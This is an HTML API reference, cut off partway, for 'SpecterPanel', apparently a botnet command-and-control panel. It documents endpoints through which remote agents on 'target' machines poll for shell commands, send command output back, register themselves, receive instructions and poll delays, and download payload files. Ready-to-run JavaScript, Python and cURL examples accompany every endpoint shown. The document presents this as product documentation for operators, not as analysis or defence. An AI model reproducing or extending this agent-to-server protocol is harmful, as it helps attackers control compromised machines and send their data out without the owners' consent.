<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>SpecterPanel API Reference</title>
  <style>
    :root {
      --bg: #0b0f12;
      --panel: #0f1417;
      --muted: #9aa6b2;
      --accent: #7bd389;
      --danger: #ff6b6b;
      --warning: #feca57;
      --info: #54a0ff;
      --glass: rgba(255,255,255,0.03);
      --code-bg: #071018;
      --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace;
      --border-radius: 8px;
      --transition: all 0.2s ease;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      margin: 0;
      font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: linear-gradient(180deg, #061018 0%, #071620 100%);
      color: #e6eef3;
      line-height: 1.6;
    }
    
    header {
      padding: 24px 24px 16px;
      border-bottom: 1px solid var(--glass);
      display: flex;
      gap: 20px;
      align-items: center;
      background: rgba(10, 15, 20, 0.7);
      backdrop-filter: blur(8px);
      position: sticky;
      top: 0;
      z-index: 100;
    }
    
    header h1 {
      margin: 0;
      font-size: 22px;
      font-weight: 600;
      color: var(--accent);
    }
    
    header p {
      margin: 8px 0 0;
      color: var(--muted);
      font-size: 14px;
      max-width: 800px;
    }
    
    .wrap {
      display: flex;
      height: calc(100vh - 82px);
      overflow: hidden;
    }
    
    nav {
      width: 300px;
      background: linear-gradient(180deg, rgba(12,18,22,0.9), rgba(10,14,18,0.8));
      padding: 18px;
      border-right: 1px solid var(--glass);
      overflow: auto;
      flex-shrink: 0;
    }
    
    nav .logo {
      font-weight: 700;
      color: var(--accent);
      margin-bottom: 8px;
      font-size: 18px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    nav small {
      display: block;
      color: var(--muted);
      margin-bottom: 16px;
      font-size: 13px;
      line-height: 1.5;
    }
    
    nav .nav-section {
      margin-top: 24px;
    }
    
    nav .nav-section-title {
      font-size: 14px;
      font-weight: 600;
      color: var(--muted);
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    nav a {
      display: block;
      padding: 10px 12px;
      border-radius: var(--border-radius);
      color: var(--muted);
      text-decoration: none;
      margin-bottom: 6px;
      font-size: 14px;
      transition: var(--transition);
    }
    
    nav a:hover, nav a.active {
      background: var(--glass);
      color: #fff;
    }
    
    nav a.active {
      border-left: 3px solid var(--accent);
    }
    
    nav .nav-footer {
      margin-top: 24px;
      color: var(--muted);
      font-size: 13px;
      padding-top: 16px;
      border-top: 1px solid var(--glass);
    }
    
    main {
      flex: 1;
      overflow: auto;
      padding: 24px;
    }
    
    section {
      background: linear-gradient(180deg, rgba(255,255,255,0.02), transparent);
      padding: 24px;
      border-radius: var(--border-radius);
      margin-bottom: 24px;
      border: 1px solid var(--glass);
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }
    
    h2 {
      margin-top: 0;
      font-size: 20px;
      color: #fff;
      margin-bottom: 16px;
    }
    
    h3 {
      font-size: 18px;
      margin: 24px 0 12px;
      color: #fff;
    }
    
    h4 {
      font-size: 16px;
      margin: 20px 0 12px;
      color: #fff;
    }
    
    p {
      margin-bottom: 16px;
      font-size: 15px;
    }
    
    .meta {
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
      margin-bottom: 16px;
      align-items: center;
    }
    
    .method-badge {
      background: rgba(123, 211, 137, 0.15);
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 600;
      color: var(--accent);
      text-transform: uppercase;
    }
    
    .badge {
      background: rgba(255,255,255,0.05);
      padding: 6px 10px;
      border-radius: var(--border-radius);
      font-size: 13px;
      color: var(--muted);
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }
    
    .badge.get { background: rgba(97, 175, 239, 0.1); color: #61afef; }
    .badge.post { background: rgba(152, 195, 121, 0.1); color: #98c379; }
    .badge.delete { background: rgba(224, 108, 117, 0.1); color: #e06c75; }
    .badge.warning { background: rgba(229, 192, 123, 0.1); color: #e5c07b; }
    .badge.info { background: rgba(86, 182, 194, 0.1); color: #56b6c2; }
    
    table {
      width: 100%;
      border-collapse: collapse;
      margin: 16px 0;
      font-size: 14px;
    }
    
    th, td {
      border: 1px solid var(--glass);
      padding: 12px;
      text-align: left;
    }
    
    th {
      background: rgba(255,255,255,0.03);
      color: var(--muted);
      font-weight: 500;
    }
    
    tr:hover {
      background: rgba(255,255,255,0.02);
    }
    
    pre.code {
      background: var(--code-bg);
      padding: 16px;
      border-radius: var(--border-radius);
      overflow: auto;
      font-family: var(--mono);
      font-size: 14px;
      color: #dbeef4;
      margin: 16px 0;
      border: 1px solid rgba(255,255,255,0.05);
      line-height: 1.5;
    }
    
    .code-toolbar {
      display: flex;
      justify-content: space-between;
      gap: 12px;
      margin-bottom: 8px;
      align-items: center;
    }
    
    .tabs {
      display: flex;
      gap: 6px;
    }
    
    .tabs button {
      background: transparent;
      border: 1px solid var(--glass);
      color: var(--muted);
      padding: 6px 12px;
      border-radius: var(--border-radius);
      cursor: pointer;
      font-size: 13px;
      transition: var(--transition);
    }
    
    .tabs button:hover {
      background: rgba(255,255,255,0.05);
    }
    
    .tabs button.active {
      background: linear-gradient(90deg, rgba(123,211,137,0.15), rgba(123,211,137,0.08));
      color: var(--accent);
      border-color: rgba(123,211,137,0.15);
    }
    
    .copy-btn {
      background: transparent;
      border: 1px solid var(--glass);
      padding: 6px 12px;
      border-radius: var(--border-radius);
      color: var(--muted);
      cursor: pointer;
      font-size: 13px;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: var(--transition);
    }
    
    .copy-btn:hover {
      background: rgba(255,255,255,0.05);
    }
    
    .copy-btn svg {
      width: 14px;
      height: 14px;
      fill: currentColor;
    }
    
    .response {
      display: flex;
      gap: 16px;
      margin-top: 16px;
    }
    
    .json {
      flex: 1;
    }
    
    .hint {
      font-size: 14px;
      color: var(--muted);
      margin: 8px 0;
      line-height: 1.5;
    }
    
    .status-code {
      display: inline-block;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: 600;
      margin-right: 8px;
    }
    
    .status-200 { background: rgba(123, 211, 137, 0.15); color: var(--accent); }
    .status-403 { background: rgba(224, 108, 117, 0.15); color: var(--danger); }
    .status-404 { background: rgba(229, 192, 123, 0.15); color: var(--warning); }
    
    .endpoint-path {
      font-family: var(--mono);
      color: #fff;
      font-size: 16px;
    }
    
    .scroll-top {
      position: fixed;
      bottom: 24px;
      right: 24px;
      background: rgba(123, 211, 137, 0.2);
      color: var(--accent);
      border: none;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      opacity: 0;
      transition: var(--transition);
      z-index: 10;
    }
    
    .scroll-top.visible {
      opacity: 1;
    }
    
    .scroll-top:hover {
      background: rgba(123, 211, 137, 0.3);
    }
    
    .search-box {
      margin-bottom: 24px;
      position: relative;
    }
    
    .search-box input {
      width: 100%;
      padding: 10px 16px;
      background: rgba(255,255,255,0.05);
      border: 1px solid var(--glass);
      border-radius: var(--border-radius);
      color: #fff;
      font-size: 14px;
    }
    
    .search-box input:focus {
      outline: none;
      border-color: rgba(123, 211, 137, 0.3);
    }
    
    .endpoint-summary {
      margin-bottom: 24px;
    }
    
    .endpoint-summary p {
      margin-bottom: 8px;
    }
    
    .required {
      color: var(--danger);
      font-size: 12px;
      margin-left: 4px;
    }
    
    @media (max-width: 900px) {
      nav {
        position: fixed;
        top: 0;
        left: 0;
        bottom: 0;
        width: 280px;
        z-index: 1000;
        transform: translateX(-100%);
        transition: transform 0.3s ease;
      }
      
      nav.open {
        transform: translateX(0);
      }
      
      .wrap {
        padding-left: 0;
      }
      
      header {
        padding: 16px;
      }
      
      main {
        padding: 16px;
      }
      
      section {
        padding: 16px;
      }
      
      .mobile-menu-btn {
        display: block;
        background: none;
        border: none;
        color: var(--muted);
        font-size: 20px;
        cursor: pointer;
      }
    }
    
    @media (min-width: 901px) {
      .mobile-menu-btn {
        display: none;
      }
    }
  </style>
</head>
<body>
  <header>
    <button class="mobile-menu-btn" id="mobileMenuBtn">☰</button>
    <div>
      <h1>SpecterPanel API Reference</h1>
      <p>Complete documentation for SpecterPanel's Machine & Web APIs. Authenticate using your <strong>API token</strong> in query parameters or JSON body. Examples provided in JavaScript (fetch), Python (requests), and cURL.</p>
    </div>
  </header>
  
  <div class="wrap">
    <nav id="sidebar">
      <div class="logo">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20Z" fill="#7bd389"/>
          <path d="M12 6C8.69 6 6 8.69 6 12C6 15.31 8.69 18 12 18C15.31 18 18 15.31 18 12C18 8.69 15.31 6 12 6ZM12 16C9.79 16 8 14.21 8 12C8 9.79 9.79 8 12 8C14.21 8 16 9.79 16 12C16 14.21 14.21 16 12 16Z" fill="#7bd389"/>
        </svg>
        SpecterPanel
      </div>
      <small>Authentication: Include <code>token</code> in query parameters (GET) or JSON body (POST) for all API requests.</small>
      
      <div class="search-box">
        <input type="text" id="searchInput" placeholder="Search endpoints...">
      </div>
      
      <div class="nav-section">
        <div class="nav-section-title">Machine API (api.py)</div>
        <a href="#api_ApiCommand" class="nav-link">GET /api/ApiCommand/&lt;target_name&gt;</a>
        <a href="#api_save_output" class="nav-link">POST /api/Apicommand/save_output</a>
        <a href="#api_BotNet" class="nav-link">GET /api/BotNet/&lt;target_name&gt;</a>
        <a href="#api_registor_target" class="nav-link">POST /api/registor_target</a>
        <a href="#api_get_instraction" class="nav-link">GET /api/get_instraction/&lt;target_name&gt;</a>
        <a href="#api_lib" class="nav-link">GET /api/lib/&lt;usePyload&gt;</a>
        <a href="#api_injection" class="nav-link">GET|POST /api/injection/&lt;target_name&gt;</a>
      </div>
      
      <div class="nav-section">
        <div class="nav-section-title">Web-side API (view.py)</div>
        <a href="#view_api_command" class="nav-link">GET|POST /api_command/&lt;targetName&gt;</a>
        <a href="#view_check_update" class="nav-link">GET /check_command_update/&lt;target_name&gt;</a>
        <a href="#view_delete_command" class="nav-link">POST /api_command/delete</a>
        <a href="#view_api_command_api" class="nav-link">GET /api_command/api/&lt;targetName&gt;</a>
        <a href="#view_api_link" class="nav-link">GET|POST /api_link</a>
        <a href="#view_api_link_delete" class="nav-link">GET /api_link_delete/&lt;ID&gt;</a>
        <a href="#view_api_link_update" class="nav-link">POST /api_link_update/&lt;ID&gt;</a>
      </div>
      
      <div class="nav-footer">
        <div style="margin-bottom: 8px;">Placeholders used:</div>
        <code>token=ABC123</code><br>
        <code>target_name=demo_target</code><br>
        <code>SERVER=your-server.com</code>
        <a href="/" style="display: block; margin-top: 12px;">← Back to Dashboard</a>
      </div>
    </nav>

    <main>
      <section id="intro">
        <h2>Introduction</h2>
        <p>This document provides comprehensive documentation for the SpecterPanel API, including both machine-facing endpoints (used by remote agents) and web-facing endpoints (used by the dashboard interface).</p>
        
        <h3>Authentication</h3>
        <p>All API requests require authentication via an API token. There are two ways to provide the token:</p>
        <ul style="margin-left: 20px; margin-bottom: 16px;">
          <li><strong>GET requests:</strong> Include as a query parameter (<code>?token=ABC123</code>)</li>
          <li><strong>POST requests:</strong> Include in the JSON request body (<code>{"token":"ABC123"}</code>)</li>
        </ul>
        
        <h3>Base URL</h3>
        <p>All examples use <code>SERVER</code> as a placeholder for your server's base URL (e.g., <code>https://panel.example.com</code>). Replace this with your actual server address when making requests.</p>
        
        <h3>Rate Limiting</h3>
        <p>The API enforces rate limits to prevent abuse. If you exceed the limit, you'll receive a <code>429 Too Many Requests</code> response. Wait before making additional requests.</p>
      </section>

      <!-- API: /api/ApiCommand/<target_name> -->
      <section id="api_ApiCommand">
        <div class="meta">
          <span class="method-badge">GET</span>
          <h2 class="endpoint-path">/api/ApiCommand/&lt;target_name&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Retrieve pending commands for a specific target. Remote agents should periodically poll this endpoint to check for new commands.</p>
          <p class="hint"><strong>Note:</strong> Agents should include their IP and OS information when available to help with command targeting.</p>
        </div>
        
        <h3>Parameters</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>token</td>
            <td>string</td>
            <td>query</td>
            <td><span class="required">*</span></td>
            <td>API token for authentication</td>
          </tr>
          <tr>
            <td>ip</td>
            <td>string</td>
            <td>query</td>
            <td></td>
            <td>Agent's IP address (optional but recommended)</td>
          </tr>
          <tr>
            <td>os</td>
            <td>string</td>
            <td>query</td>
            <td></td>
            <td>Agent's operating system (optional but recommended)</td>
          </tr>
          <tr>
            <td>target_name</td>
            <td>string</td>
            <td>path</td>
            <td><span class="required">*</span></td>
            <td>Unique identifier for the target machine</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - Returns all pending commands</div>
            <pre class="code">{
  "allCommand": [
    ["ID", "email", "target_name", "command", "condition", "update"],
    ["cmd123", "admin@example.com", "demo_target", "whoami", "linux", "2023-08-11 12:00:00"],
    ...
  ]
}</pre>
          </div>
          <div class="json">
            <div class="hint"><span class="status-code status-403">403</span> Invalid token or unauthorized</div>
            <pre class="code">{ "Error": "Invalid token" }</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="api_ApiCommand-js">JavaScript</button>
            <button class="tab-btn" data-target="api_ApiCommand-py">Python</button>
            <button class="tab-btn" data-target="api_ApiCommand-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="api_ApiCommand-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="api_ApiCommand-js" class="code">// JavaScript (fetch)
fetch('http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux')
  .then(response => {
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    return response.json();
  })
  .then(data => console.log('Received commands:', data))
  .catch(error => console.error('Error fetching commands:', error));</pre>

        <pre id="api_ApiCommand-py" class="code" style="display:none"># Python (requests)
import requests

params = {
    'token': 'ABC123',
    'ip': '10.0.0.2',
    'os': 'linux'
}

try:
    response = requests.get(
        'http://SERVER/api/ApiCommand/demo_target',
        params=params
    )
    response.raise_for_status()  # Raises exception for 4XX/5XX status
    print("Commands:", response.json())
except requests.exceptions.RequestException as e:
    print("Error fetching commands:", e)</pre>

        <pre id="api_ApiCommand-curl" class="code" style="display:none"># cURL
curl -X GET \
  "http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux" \
  -H "Accept: application/json"</pre>
      </section>

      <!-- API: /api/Apicommand/save_output -->
      <section id="api_save_output">
        <div class="meta">
          <span class="method-badge">POST</span>
          <h2 class="endpoint-path">/api/Apicommand/save_output</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Submit command execution results back to the server. Agents should call this after executing received commands.</p>
          <p class="hint"><strong>Note:</strong> The output should be an array of arrays, each containing a command ID and its corresponding output.</p>
        </div>
        
        <h3>Request Body (JSON)</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>token</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>API token matching the registered target</td>
          </tr>
          <tr>
            <td>target_name</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>Target identifier that executed the commands</td>
          </tr>
          <tr>
            <td>output</td>
            <td>array</td>
            <td><span class="required">*</span></td>
            <td>Array of [command_id, output_text] pairs</td>
          </tr>
          <tr>
            <td>ip</td>
            <td>string</td>
            <td></td>
            <td>Agent's current IP address (optional)</td>
          </tr>
          <tr>
            <td>os</td>
            <td>string</td>
            <td></td>
            <td>Agent's operating system (optional)</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - Outputs saved</div>
            <pre class="code">{ "message": "Outputs were saved successfully" }</pre>
          </div>
          <div class="json">
            <div class="hint"><span class="status-code status-403">403</span> Invalid token or target</div>
            <pre class="code">{ "Error": "Invalid token or target" }</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="api_save_output-js">JavaScript</button>
            <button class="tab-btn" data-target="api_save_output-py">Python</button>
            <button class="tab-btn" data-target="api_save_output-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="api_save_output-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="api_save_output-js" class="code">// JavaScript (fetch)
const commandOutputs = [
  ["cmd123", "user123\n"],
  ["cmd124", "Linux hostname 5.4.0-104-generic\n"]
];

fetch('http://SERVER/api/Apicommand/save_output', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    token: 'ABC123',
    target_name: 'demo_target',
    ip: '10.0.0.2',
    os: 'linux',
    output: commandOutputs
  })
})
.then(response => response.json())
.then(data => console.log('Server response:', data))
.catch(error => console.error('Error:', error));</pre>

        <pre id="api_save_output-py" class="code" style="display:none"># Python (requests)
import requests

output_data = {
    'token': 'ABC123',
    'target_name': 'demo_target',
    'ip': '10.0.0.2',
    'os': 'linux',
    'output': [
        ['cmd123', 'user123\n'],
        ['cmd124', 'Linux hostname 5.4.0-104-generic\n']
    ]
}

try:
    response = requests.post(
        'http://SERVER/api/Apicommand/save_output',
        json=output_data
    )
    print("Server response:", response.json())
except Exception as e:
    print("Error:", e)</pre>

        <pre id="api_save_output-curl" class="code" style="display:none"># cURL
curl -X POST "http://SERVER/api/Apicommand/save_output" \
  -H "Content-Type: application/json" \
  -d '{
    "token": "ABC123",
    "target_name": "demo_target",
    "ip": "10.0.0.2",
    "os": "linux",
    "output": [
      ["cmd123", "user123\\n"],
      ["cmd124", "Linux hostname 5.4.0-104-generic\\n"]
    ]
  }'</pre>
      </section>

      <!-- API: /api/BotNet/<target_name> -->
      <section id="api_BotNet">
        <div class="meta">
          <span class="method-badge">GET</span>
          <h2 class="endpoint-path">/api/BotNet/&lt;target_name&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Retrieve botnet-related data stored for a specific target. This endpoint returns key-value pairs that can be used to store and retrieve arbitrary data associated with a target.</p>
        </div>
        
        <h3>Parameters</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>token</td>
            <td>string</td>
            <td>query</td>
            <td><span class="required">*</span></td>
            <td>API token for authentication</td>
          </tr>
          <tr>
            <td>target_name</td>
            <td>string</td>
            <td>path</td>
            <td><span class="required">*</span></td>
            <td>Unique identifier for the target machine</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - Returns botnet data</div>
            <pre class="code">{
  "bot_id": "botnet_node_123",
  "last_seen": "2023-08-11 12:00:00",
  "status": "active",
  "custom_data": "any_value"
}</pre>
          </div>
          <div class="json">
            <div class="hint"><span class="status-code status-403">403</span> Invalid token or unauthorized</div>
            <pre class="code">{ "Error": "Invalid token" }</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="api_BotNet-js">JavaScript</button>
            <button class="tab-btn" data-target="api_BotNet-py">Python</button>
            <button class="tab-btn" data-target="api_BotNet-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="api_BotNet-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="api_BotNet-js" class="code">// JavaScript (fetch)
fetch('http://SERVER/api/BotNet/demo_target?token=ABC123')
  .then(response => {
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    return response.json();
  })
  .then(data => console.log('BotNet data:', data))
  .catch(error => console.error('Error:', error));</pre>

        <pre id="api_BotNet-py" class="code" style="display:none"># Python (requests)
import requests

try:
    response = requests.get(
        'http://SERVER/api/BotNet/demo_target',
        params={'token': 'ABC123'}
    )
    response.raise_for_status()
    print("BotNet data:", response.json())
except requests.exceptions.RequestException as e:
    print("Error:", e)</pre>

        <pre id="api_BotNet-curl" class="code" style="display:none"># cURL
curl -X GET \
  "http://SERVER/api/BotNet/demo_target?token=ABC123" \
  -H "Accept: application/json"</pre>
      </section>

      <!-- API: /api/registor_target -->
      <section id="api_registor_target">
        <div class="meta">
          <span class="method-badge">POST</span>
          <h2 class="endpoint-path">/api/registor_target</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Register a new target with the SpecterPanel system. This endpoint creates a new target entry and returns the assigned target name (which may include a timestamp suffix for uniqueness).</p>
          <p class="hint"><strong>Note:</strong> Requires a valid ApiToken with registration permissions.</p>
        </div>
        
        <h3>Request Body (JSON)</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>token</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>ApiToken with registration permissions</td>
          </tr>
          <tr>
            <td>target_name</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>Desired base name for the target (server may append timestamp)</td>
          </tr>
          <tr>
            <td>ip</td>
            <td>string</td>
            <td></td>
            <td>Agent's current IP address (optional)</td>
          </tr>
          <tr>
            <td>os</td>
            <td>string</td>
            <td></td>
            <td>Agent's operating system (optional)</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - Target registered</div>
            <pre class="code">{ "target_name": "demo_target_20230811120000" }</pre>
          </div>
          <div class="json">
            <div class="hint"><span class="status-code status-403">403</span> Invalid or unauthorized token</div>
            <pre class="code">{ "Error": "Invalid api_token" }</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="api_registor_target-js">JavaScript</button>
            <button class="tab-btn" data-target="api_registor_target-py">Python</button>
            <button class="tab-btn" data-target="api_registor_target-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="api_registor_target-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="api_registor_target-js" class="code">// JavaScript (fetch)
fetch('http://SERVER/api/registor_target', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    token: 'ABC123',
    target_name: 'demo_target',
    ip: '10.0.0.2',
    os: 'linux'
  })
})
.then(response => response.json())
.then(data => console.log('Registered target:', data.target_name))
.catch(error => console.error('Error:', error));</pre>

        <pre id="api_registor_target-py" class="code" style="display:none"># Python (requests)
import requests

registration_data = {
    'token': 'ABC123',
    'target_name': 'demo_target',
    'ip': '10.0.0.2',
    'os': 'linux'
}

try:
    response = requests.post(
        'http://SERVER/api/registor_target',
        json=registration_data
    )
    print("Registered target:", response.json())
except Exception as e:
    print("Error:", e)</pre>

        <pre id="api_registor_target-curl" class="code" style="display:none"># cURL
curl -X POST "http://SERVER/api/registor_target" \
  -H "Content-Type: application/json" \
  -d '{
    "token": "ABC123",
    "target_name": "demo_target",
    "ip": "10.0.0.2",
    "os": "linux"
  }'</pre>
      </section>

      <!-- API: /api/get_instraction/<target_name> -->
      <section id="api_get_instraction">
        <div class="meta">
          <span class="method-badge">GET</span>
          <h2 class="endpoint-path">/api/get_instraction/&lt;target_name&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Retrieve the current instruction and delay interval for a target. Agents should call this endpoint to check for new instructions and determine how long to wait before checking again.</p>
        </div>
        
        <h3>Parameters</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>token</td>
            <td>string</td>
            <td>query</td>
            <td><span class="required">*</span></td>
            <td>API token for authentication</td>
          </tr>
          <tr>
            <td>ip</td>
            <td>string</td>
            <td>query</td>
            <td></td>
            <td>Agent's IP address (optional)</td>
          </tr>
          <tr>
            <td>os</td>
            <td>string</td>
            <td>query</td>
            <td></td>
            <td>Agent's operating system (optional)</td>
          </tr>
          <tr>
            <td>target_name</td>
            <td>string</td>
            <td>path</td>
            <td><span class="required">*</span></td>
            <td>Unique identifier for the target machine</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - Returns instruction and delay</div>
            <pre class="code">{
  "delay": 60,
  "instraction": "check_for_updates"
}</pre>
          </div>
          <div class="json">
            <div class="hint"><span class="status-code status-404">404</span> No instruction found</div>
            <pre class="code">{ "Message": "No instraction found" }</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="api_get_instraction-js">JavaScript</button>
            <button class="tab-btn" data-target="api_get_instraction-py">Python</button>
            <button class="tab-btn" data-target="api_get_instraction-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="api_get_instraction-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="api_get_instraction-js" class="code">// JavaScript (fetch)
fetch('http://SERVER/api/get_instraction/demo_target?token=ABC123&ip=10.0.0.2&os=linux')
  .then(response => {
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    return response.json();
  })
  .then(data => {
    console.log('Instruction:', data.instraction);
    console.log('Next check in:', data.delay, 'seconds');
  })
  .catch(error => console.error('Error:', error));</pre>

        <pre id="api_get_instraction-py" class="code" style="display:none"># Python (requests)
import requests

params = {
    'token': 'ABC123',
    'ip': '10.0.0.2',
    'os': 'linux'
}

try:
    response = requests.get(
        'http://SERVER/api/get_instraction/demo_target',
        params=params
    )
    response.raise_for_status()
    data = response.json()
    print("Instruction:", data.get('instraction'))
    print("Next check in:", data.get('delay'), "seconds")
except requests.exceptions.RequestException as e:
    print("Error:", e)</pre>

        <pre id="api_get_instraction-curl" class="code" style="display:none"># cURL
curl -X GET \
  "http://SERVER/api/get_instraction/demo_target?token=ABC123&ip=10.0.0.2&os=linux" \
  -H "Accept: application/json"</pre>
      </section>

      <!-- API: /api/lib/<usePyload> -->
      <section id="api_lib">
        <div class="meta">
          <span class="method-badge">GET</span>
          <h2 class="endpoint-path">/api/lib/&lt;usePyload&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Retrieve a library or payload file from the server. This endpoint serves static files that agents may need for their operation.</p>
          <p class="hint"><strong>Note:</strong> The implementation expects the token in the JSON body, which is unusual for GET requests. Consult server code for exact requirements.</p>
        </div>
        
        <h3>Parameters</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>token</td>
            <td>string</td>
            <td>body</td>
            <td><span class="required">*</span></td>
            <td>API token for authentication</td>
          </tr>
          <tr>
            <td>ip</td>
            <td>string</td>
            <td>body</td>
            <td></td>
            <td>Agent's IP address (optional)</td>
          </tr>
          <tr>
            <td>os</td>
            <td>string</td>
            <td>body</td>
            <td></td>
            <td>Agent's operating system (optional)</td>
          </tr>
          <tr>
            <td>usePyload</td>
            <td>string</td>
            <td>path</td>
            <td><span class="required">*</span></td>
            <td>Filename of the payload to retrieve</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - Returns file content</div>
            <pre class="code">(Raw file content as text/plain)</pre>
          </div>
          <div class="json">
            <div class="hint"><span class="status-code status-404">404</span> File not found</div>
            <pre class="code">{ "Error": "File not found" }</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="api_lib-js">JavaScript</button>
            <button class="tab-btn" data-target="api_lib-py">Python</button>
            <button class="tab-btn" data-target="api_lib-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="api_lib-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
